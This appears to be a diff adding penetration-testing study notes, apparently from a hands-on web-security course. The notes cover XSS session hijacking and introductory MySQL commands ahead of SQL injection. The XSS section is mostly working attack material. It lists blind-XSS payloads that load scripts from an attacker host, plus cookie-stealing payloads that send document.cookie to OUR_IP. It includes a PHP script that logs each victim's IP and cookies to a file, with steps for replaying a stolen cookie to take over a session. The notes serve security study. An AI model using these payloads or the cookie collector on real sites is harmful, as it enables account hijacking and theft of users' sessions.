@@ -267,3 +267,104 @@ Command: mkdir /tmp/tmpserver
 Command: cd /tmp/tmpserver
 Command: nano index.php #at this step we wrote our index.php file
 Command: sudo php -S 0.0.0.0:80
+## Session Hijacking
+Note: With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.
+- Blind XSS
+Note: A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
+Common Forms Vulnerable to Blind XSS:
+    Contact Forms
+    Reviews
+    User Details
+    Support Tickets
+    HTTP User-Agent header
+Question: How can we test for blind XSS if we can see the output of our script?
+Answer: We can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.
+- Loading a Remote Script
+Payload: <script src="http://OUR_IP/script.js"></script> # Including a remote script
+Note: We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script
+Payload: <script src="http://OUR_IP/username"></script>
+Note: If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on.
+RemoteScript Test Payloads:
+Payload: <script src=http://OUR_IP></script>
+Payload: '><script src=http://OUR_IP></script>
+Payload: "><script src=http://OUR_IP></script>
+Payload: javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+Payload: <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+Payload: <script>$.getScript("http://OUR_IP")</script>
+Note: A session hijacking attack is very similar to the phishing attack we performed in the previous section. It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
+Cookie Test Payloads:
+Payload: document.location='http://OUR_IP/index.php?c='+document.cookie;
+Payload: new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+Note: if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
+PHP Script:
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+Note: Should store the cookie(s) neatly in a text file. 
+Note: Once we have login cookie, we can use it to hijack the users session. Paste in Storage Value. Reload page.
+# SQL Injection Fundamentals
+Note: When user-supplied information is used to construct the query to the database, malicious users can trick the query into being used for something other than what the original programmer intended, providing the user access to query the database using an attack known as SQL injection (SQLi).
+Note: There are relational and non-relational databases.
+Note: Relational = A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database.
+Note: A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.
+Note: Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.
+-MySQL
+Command: mysql -u root -p # Interacting with mysql database. If password is used in command then no space between -p<pass>.
+Command: mysql -u root -h docker.hackthebox.eu -P 3306 -p # Specify a remote host and port.
+-MySQL Commands
+Command: CREATE DATABASE users; # Create a database.
+Command: SHOW DATABASES; # Show databases.
+Command: USE users; # change to specified database.
+mysql> CREATE TABLE logins (     # create a table w/ columns.
+    ->     id INT,
+    ->     username VARCHAR(100),
+    ->     password VARCHAR(100),
+    ->     date_of_joining DATETIME
+    ->     );
+Command: DESCRIBE logins; # List the table structure within its fields and data types.
+Note: Within the CREATE TABLE query, there are many properties that can be set for the table and each column. For example, we can set the id column to auto-increment using the AUTO_INCREMENT keyword, which automatically increments the id by one every time a new item is added to the table:
+!Note: one of the most important properties is PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the id column the PRIMARY KEY for this table:
+Command: PRIMARY KEY (id)
+Cmd: CREATE TABLE logins (       # Putting it all together.
+     id INT NOT NULL AUTO_INCREMENT,
+     username VARCHAR(100) UNIQUE NOT NULL,
+     password VARCHAR(100) NOT NULL,
+     date_of_joining DATETIME DEFAULT NOW(),
+     PRIMARY KEY (id)
+     );
+-MySQL Statements
+* INSERT = used to add new records to a given table.
+EX: INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
+EX: INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!'); # Insert multiple entries at once.
+* SELECT = retrieve data. Can also be used for many other purposes.
+EX: SELECT * FROM table_name;
+* DROP = Remove tables and databases from the server.
+EX: DROP TABLE logins;
+ALTER = Change the name of any table and any of its fields or to delete or add a new column to an existing table.
+EX: ALTER TABLE logins ADD newColumn INT;
+EX: ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn; # Use rename column to rename column. Modify and drop also exist.
+* UPDATE = Used to update specific records within a table, based on certain conditions. 
+EX: UPDATE logins SET password = 'change_password' WHERE id > 1; # This query updated all passwords in all records where the id was more significant than 1.
+- Controlling Results Output
+* ORDER BY = We can sort the results of any query
+EX: SELECT * FROM logins ORDER BY password;
+Note: By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC
+EX: SELECT * FROM logins ORDER BY password DESC;
+Note: It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column.
+EX: SELECT * FROM logins ORDER BY password DESC, id ASC;
+* LIMIT = In case our query returns a large number of records, we can LIMIT the results to what we want. 
+EX: SELECT * FROM logins LIMIT 2;
+* WHERE = To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause.
+EX: SELECT * FROM logins WHERE id > 1;
+Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.
+* LIKE = Enabling selecting records by matching a certain pattern. 
+EX: SELECT * FROM logins WHERE username LIKE 'admin%'; # The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. 
+- SQL Operators
